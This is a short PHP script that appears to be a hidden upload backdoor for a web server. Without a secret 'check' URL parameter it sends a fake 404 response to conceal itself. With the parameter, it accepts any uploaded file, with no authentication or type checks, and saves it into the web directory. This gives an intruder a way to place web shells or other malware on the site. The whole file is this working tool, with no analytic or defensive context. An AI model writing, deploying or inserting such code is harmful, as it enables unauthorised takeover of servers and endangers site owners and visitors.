<?php
if(!isset($_GET["check"])){
	header("HTTP/1.0 404 Not Found");
	exit;
}
$uploaddir = './';
$uploadfile = $uploaddir . basename($_FILES['userfile']['name']);
if ( isset($_FILES["userfile"]) ) {
    echo "Upload ";
    if (move_uploaded_file
($_FILES["userfile"]["tmp_name"], $uploadfile))
echo $uploadfile;
    else echo "failed";
}

?>

<form name="uplform" method="post" enctype="multipart/form-data">
<p align="center">
<input type="file" name="userfile">
<input type="submit">
</p></form>